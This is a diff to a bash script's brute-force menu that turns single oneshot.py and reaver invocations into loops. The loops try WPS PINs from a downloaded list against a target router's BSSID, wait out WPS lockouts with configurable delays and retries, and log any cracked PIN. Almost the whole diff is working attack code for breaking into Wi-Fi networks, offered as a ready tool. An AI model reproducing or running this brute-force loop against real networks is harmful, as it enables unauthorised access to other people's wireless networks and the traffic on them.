@@ -720,6 +720,15 @@ special_bruteforce_menu() {
     fi
     
     echo ""
+    echo "Configure attack options:"
+    read -p "Delay between attempts (seconds) [1]: " delay
+    delay="${delay:-1}"
+    read -p "Lock timeout when WPS locked (seconds) [300]: " lock_timeout
+    lock_timeout="${lock_timeout:-300}"
+    read -p "Max lock retries before giving up [3]: " max_retries
+    max_retries="${max_retries:-3}"
+    
+    echo ""
     echo "Select attack method:"
     echo "1. oneshot.py (fast, WiFi interface)"
     echo "2. Monitor mode (reaver, requires monitor mode)"
@@ -736,7 +745,42 @@ special_bruteforce_menu() {
             if [[ ! -f "$PIN_FILE" ]]; then
                 download_pin_file "$workdir" || return 1
             fi
-            python3 "$SNX_ONESHOT" -i "$adapter" -b "$bssid" -d "$PIN_FILE"
+            
+            lock_count=0
+            pin_tried=0
+            pin_found=0
+            
+            while IFS= read -r pin || [[ -n "$pin" ]]; do
+                [[ "$pin" =~ ^[0-9]{4,8}$ ]] || continue
+                ((pin_tried++))
+                
+                echo "[$pin_tried] Trying PIN: $pin"
+                output=$(python3 "$SNX_ONESHOT" -i "$adapter" -b "$bssid" -B --pin "$pin" 2>&1)
+                echo "$output"
+                
+                if echo "$output" | grep -qi "success\|cracked\|found\|psk\|wpa"; then
+                    echo "SUCCESS! PIN found: $pin"
+                    echo "$bssid:$pin" >> "$workdir/wps_log.txt"
+                    pin_found=1
+                    break
+                fi
+                
+                if echo "$output" | grep -qi "lock\|locked"; then
+                    ((lock_count++))
+                    echo "WPS lock detected! Waiting $lock_timeout seconds... (Attempt $lock_count/$max_retries)"
+                    if [[ $lock_count -ge $max_retries ]]; then
+                        echo "Max lock retries reached. Aborting."
+                        break
+                    fi
+                    sleep "$lock_timeout"
+                fi
+                
+                sleep "$delay"
+            done < "$PIN_FILE"
+            
+            if [[ $pin_found -eq 0 ]]; then
+                echo "PIN not found in file. Tried $pin_tried PINs."
+            fi
             ;;
         2)
             echo "Using monitor mode with reaver..."
@@ -756,8 +800,40 @@ special_bruteforce_menu() {
                 download_pin_file "$workdir" || { airmon-ng stop "$mon_adapter" >/dev/null 2>&1; return 1; }
             fi
             
+            lock_count=0
+            pin_tried=0
+            pin_found=0
+            
             echo "Starting reaver with PIN file..."
-            reaver -i "$mon_adapter" -b "$bssid" -d 1 -f -vv -D "$PIN_FILE"
+            while IFS= read -r pin || [[ -n "$pin" ]]; do
+                [[ "$pin" =~ ^[0-9]{4,8}$ ]] || continue
+                ((pin_tried++))
+                
+                echo "[$pin_tried] Trying PIN: $pin"
+                output=$(reaver -i "$mon_adapter" -b "$bssid" -p "$pin" -d "$delay" -l "$lock_timeout" -vv 2>&1)
+                echo "$output"
+                
+                if echo "$output" | grep -qi "success\|cracked\|wps key\|pin.*found"; then
+                    echo "SUCCESS! PIN found: $pin"
+                    echo "$bssid:$pin" >> "$workdir/wps_log.txt"
+                    pin_found=1
+                    break
+                fi
+                
+                if echo "$output" | grep -qi "lock\|locked"; then
+                    ((lock_count++))
+                    echo "WPS lock detected! Waiting $lock_timeout seconds... (Attempt $lock_count/$max_retries)"
+                    if [[ $lock_count -ge $max_retries ]]; then
+                        echo "Max lock retries reached. Aborting."
+                        break
+                    fi
+                    sleep "$lock_timeout"
+                fi
+            done < "$PIN_FILE"
+            
+            if [[ $pin_found -eq 0 ]]; then
+                echo "PIN not found in file. Tried $pin_tried PINs."
+            fi
             
             airmon-ng stop "$mon_adapter" >/dev/null 2>&1
             ;;
